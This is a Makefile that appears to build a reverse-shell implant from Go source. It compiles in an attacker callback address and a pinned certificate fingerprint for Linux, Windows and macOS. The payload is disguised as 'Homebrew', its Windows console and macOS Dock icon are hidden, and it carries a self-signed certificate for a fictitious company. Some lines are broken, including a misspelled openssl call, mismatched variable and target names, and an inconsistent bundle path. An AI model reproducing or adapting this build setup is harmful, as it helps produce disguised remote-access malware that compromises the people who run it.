# Makefile
BUILD=go build 
SOURCE=main.go
OUT_LINUX=Homebrew
OUT_WINDOWS=Homebrew.exe
SRV_KEY=server.key 
DOMAIN=kaizentek
SRV_PEM=server.pem 
LINUX_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
WINDOWS_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(opensll x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"

all: clean depends shell

dependencies:
	openssl req -subj '/CN=kaizentek.io/O=KaizenTek/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}

shell: 
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

linux32:
	GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

linux64:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC} 

windows32:
	GOOS=windows GOARCH=386 ${BUILD} ${WINDOWS_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}

windows64:
	GOOS=windows GOARCH=amd64 ${BUILD} ${WINDOWS_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}

macos32:
	GOOS=darwin GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ./Homebrew.app/Contents/MacOS/${OUT_LINUX} ${SRC}
	echo "<?xml version="1.0" encoding="UTF-8"?> \
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> \
		<plist version="1.0"> \
		<dict> \
			<key>CFBundleExecutable</key> \
			<string>${OUT_LINUX}</string> \
			<key>CFBundleIconFile</key> \
			<string>icon.icns</string> \
			<key>CFBundleIdentifier</key> \
			<string>com.${DOMAIN}.app</string> \
			<key>NSHighResolutionCapable</key> \
			<true/> \
			<key>LSUIElement</key> \
			<true/> \
		</dict> \
		</plist>" >> ./homebrew.app/Contents/Info.plist

macos64:
	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ./Homebrew.app/Contents/MacOS/${OUT_LINUX} ${SRC}
	echo "<?xml version="1.0" encoding="UTF-8"?> \
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> \
		<plist version="1.0"> \
		<dict> \
			<key>CFBundleExecutable</key> \
			<string>${OUT_LINUX}</string> \
			<key>CFBundleIconFile</key> \
			<string>icon.icns</string> \
			<key>CFBundleIdentifier</key> \
			<string>com.${DOMAIN}.app</string> \
			<key>NSHighResolutionCapable</key> \
			<true/> \
			<key>LSUIElement</key> \
			<true/> \
		</dict> \
		</plist>" >> ./homebrew.app/Contents/Info.plist

clean:
	rm -rf ${SRV_KEY} ${SRV_PEM} ${OUT_LINUX} ${OUT_WINDOWS} ./Homebrew.app/Contents/MacOS/${OUT_LINUX}
	> ./Homebrew.app/Contents/Info.plist
	